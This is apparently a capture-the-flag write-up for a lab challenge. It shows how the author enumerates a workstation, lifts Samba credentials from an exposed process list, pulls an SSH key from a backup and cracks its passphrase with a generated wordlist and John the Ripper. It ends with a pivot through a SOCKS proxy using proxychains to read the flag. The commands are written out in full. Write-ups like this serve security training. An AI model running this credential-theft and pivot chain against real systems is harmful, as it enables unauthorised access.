Security conerns: Johny's notes
======================================


## Task
Hi, TCC-CSIRT analyst,

please check if any inappropriate services are running on the workstation john.admins.cypherfix.tcc. We know that this workstation belongs to an administrator who likes to experiment on his own machine.

## Solution

You can do nothing wrong with nmap, so scan all ports on the workstation. There is open port 22 (SSH), 80 (apache) and 23000. Port 23000 is weird, it's possible to open it but it returns nothing, nmap with scan service return nothing... So, we can start with apache. Browser returns page "Hello world in PHP." No default page, probably there is running php. Enumeration with dirb return nothing interesting... but, there is PHP. So let's try it again with .php extension:

```
# dirb http://john.admins.cypherfix.tcc -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 29 11:54:54 2024
URL_BASE: http://john.admins.cypherfix.tcc/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://john.admins.cypherfix.tcc/ ----
+ http://john.admins.cypherfix.tcc/environment.php (CODE:200|SIZE:3179)                                                                                        
+ http://john.admins.cypherfix.tcc/index.php (CODE:200|SIZE:28)
```

Interesting, we've discovered environment.php. On this page there are some statistics of the system and running processes. Running processes give us some answers. First, now we know what port 23000. There is opened SSH connection to host 10.99.24.100 with user backuper and option -D. Which means that on port 23000 we have SOCKS proxy: if we use SOCKS proxy client on this port, our connection will be made from 10.99.24.100 host.

Second, if we monitor process list some time, we find out this process:

```
smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c put /backup/backup-1730217601.tgz backup-home.tgz
```

So it means that on host 10.99.24.100 is running samba server, we have credentials for it and also on this share will be some backup from workstation. Note that I have very great luck as the smbclient process was running when I opened web page for first time. I'm not sure when I will try to refresh it for ~10 minuts if I didn't see that process with credentials :-)

So, now run smbclient and download backup-home.tgz. If we try to connect to workstation with SSH we find out that only login with SSH key is permitted. If we extract home backup which we now have, we find private SSH key there. Encrypted. Also we can look on authorized_key which confirms, that we can login with this key but only from 10.99.24.100 host. So, change permission on id_rsa key to 600 so ssh can use it. Install proxychains and in /etc/proxychains.conf append line "socks5 10.99.24.101 23000". Now we can open SSH connection with this command: proxychains ssh -l john@tcc.local 10.99.24.101 -i id_rsa

Only missing piece is password for private key. So what is the most exciting file in every home directory? .bash_history for sure :-) There are two interesting lines:

```
Enterprise1512
ssh-keygen -p -f ~/.ssh/id_rsa
```

Second command change passphrase for key. First one seems like password. This password is not working anymore. But usually, when user has to change password and password had number on the end, you can bet, that only number in password was changed :-) So generate password list:

```
for i in $(seq 10000); do printf "Enterprise%04d\n" $i; done > list.txt
```

And crack it with John The Ripper (note that hashcat should also work and with mask shouldn't be needed generating password list but on my WS for some reason hashcat won't recognize SSH keyfile):

````
ssh2john id_rsa > hash
john --wordlist=./list.txt hash
john --show hash  
id_rsa:Enterprise2215
```

And now just login with proxychains and SSH:

```
# proxychains ssh -l john@tcc.local 10.99.24.101 -i id_rsa
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.99.24.101:23000  ...  10.99.24.101:22  ...  OK
Enter passphrase for key 'id_rsa': 
FLAG{sIej-5d9a-aIbh-v4qH}
```
